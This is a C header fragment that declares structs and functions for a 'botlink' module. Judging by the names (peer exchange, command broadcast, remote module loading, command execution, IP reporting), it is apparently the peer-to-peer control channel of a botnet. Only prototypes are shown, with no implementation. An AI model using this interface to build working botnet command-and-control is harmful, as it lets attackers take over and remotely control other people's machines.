typedef struct CmdHdr {
    unsigned char cmd;
    unsigned short size;
    uint32_t authorization;
} CMDHdr;

typedef struct _peerinfo {
        uint32_t addr;
        unsigned short port;
    } PeerInfo;
    
int botlink_init(Modules **);
int botlink_main_loop(Modules *mptr, Connection *cptr, char *buf, int size);
int botlink_write(Modules *mptr, Connection *cptr, char **buf, int *size);
int botlink_read(Modules *mptr, Connection *cptr, char **buf, int *size);
int botlink_incoming(Modules *mptr, Connection *cptr, char *buf, int size);
int botlink_outgoing(Modules *mptr, Connection *cptr, char **buf, int *size);
int botlink_connect(Modules *mptr, Connection *cptr, char *buf, int size);
int botlink_disconnect(Modules *mptr, Connection *cptr, char *buf, int size);

int botlink_handshake(Modules *mptr, Connection *cptr, char *buf, int size);
int botlink_keyexchange(Modules *mptr, Connection *cptr, char *buf, int size);
int botlink_message_exec(Modules *mptr, Connection *cptr, char *buf, int size, bool from_p2p);
int botlink_message(Modules *mptr, Connection *cptr, char *buf, int size);
int botlink_cmd_broadcast(Modules *mptr, Connection *cptr, char *buf, int size);
int botlink_cmd_ping(Modules *mptr, Connection *cptr, char *buf, int size);
int botlink_pingpong(Modules *mptr, Connection *cptr, int pong);
int botlink_cmd_loadmodule(Modules *mptr, Connection *cptr, char *buf, int size);
int botlink_cmd_unloadmodule(Modules *mptr, Connection *cptr, char *buf, int size);
int botlink_cmd_execute(Modules *mptr, Connection *cptr, char *buf, int size);
int botlink_cmd_control_module(Modules *mptr, Connection *cptr, char *buf, int size);

int botlink_broadcast(Modules *mptr, Connection *cptr, char *buf, int size);
int botlink_cmd_report_ip(Modules *mptr, Connection *cptr, char *buf, int size);
int botlink_cmd_want_peers(Modules *mptr, Connection *cptr, char *buf, int size);
int botlink_cmd_peer_info(Modules *mptr, Connection *cptr, char *buf, int size);
int bot_pushcmd(Modules *mptr, Connection *cptr, unsigned char cmd, char *pkt, int pktsize);